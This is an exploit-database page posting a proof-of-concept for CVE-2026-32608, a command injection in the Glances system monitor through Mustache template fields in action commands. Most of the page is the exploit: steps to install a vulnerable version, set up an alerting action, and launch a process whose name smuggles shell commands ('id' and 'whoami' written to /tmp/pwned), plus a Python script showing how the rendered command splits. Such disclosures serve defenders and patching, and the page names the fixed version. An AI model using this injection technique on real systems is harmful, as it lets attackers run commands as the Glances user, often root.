---
title: Glances < = 4.5.2  OS Command Injection via Mustache Template Fields
url: https://cxsecurity.com/issue/WLB-2026030026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-18
fetch_date: 2026-03-19T04:14:43.274683
---

# Glances < = 4.5.2  OS Command Injection via Mustache Template Fields

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Glances <= 4.5.2 OS Command Injection via Mustache Template Fields** **2026.03.18**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-32608](https://cxsecurity.com/cveshow/CVE-2026-32608/ "Click to see CVE-2026-32608")**  CWE: **[CWE-78 (Improper Neutralization of Special Elements used in an OS Command (&#039;OS Command Injection&#039;))](https://cxsecurity.com/cwe/CWE-78%20%28Improper%20Neutralization%20of%20Special%20Elements%20used%20in%20an%20OS%20Command%20%28%26#039;OS Command Injection&#039;)) "Click to see CWE-78 (Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'))")** | |

#!/usr/bin/env python3
# Exploit Title: Glances <= 4.5.2 OS Command Injection via Mustache Template Fields
# CVE: CVE-2026-32608
# Date: 2026-03-18
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://github.com/nicolargo/glances
# Software Link: https://pypi.org/project/glances/
# Affected: Glances <= 4.5.2-dev01 (pip / source installs)
# Tested on: Glances 4.5.1
# Category: Remote
# Platform: Linux / macOS / Windows (where Glances runs)
# Exploit Type: Command Injection
# CVSS: 7.0 (High)
# Description: Glances insecurely processes user-controlled values (process names, container names, mount points) in Mustache templates used in action commands. Malicious entity names can inject arbitrary OS commands via | && > separators before secure\_popen splitting logic.
# Fixed in: Glances 4.5.2 (commit 6f4ec53d967478e69917078e6f73f448001bf107)
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# -- (no command-line options implemented in this minimal PoC)
#
# Notes:
# • Requires Glances to be running with a config containing action commands using {{name}}, {{container\_name}} etc.
# • Attacker must be able to create/rename processes or Docker containers on the target system.
# • Executes commands as the user running Glances (often root when run as service)
#
# How to Use
#
# Step 1:
# Install vulnerable version: pip install "glances<4.5.2"
#
# Step 2:
# Create glances.conf with e.g.:
# [processlist]
# critical\_action=echo "ALERT: {{name}}" >> /tmp/alert.log
#
# Step 3:
# Run Glances: glances --config glances.conf
#
# Step 4:
# Create malicious process:
# cp /bin/sleep "/tmp/ok|id>/tmp/pwned;whoami>>/tmp/pwned||"
# "/tmp/ok|id>/tmp/pwned;whoami>>/tmp/pwned||" 999 &
#
# Step 5:
# Wait for Glances to evaluate process list and trigger action
import subprocess
import shlex
def vulnerable\_secure\_popen(cmd: str):
for sep in ("&&", "|", ">"):
cmd = cmd.replace(sep, f" {sep} ")
parts = [p.strip() for p in cmd.split() if p.strip()]
for part in parts:
print(f"[EXEC] {part}")
malicious\_name = 'innocent|id>/tmp/pwned;whoami>>/tmp/pwned||'
template = 'echo "ALERT: {{name}} used 99% CPU" >> /tmp/alerts.log'
rendered = template.replace('{{name}}', malicious\_name)
print("Rendered command:", rendered)
vulnerable\_secure\_popen(rendered)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top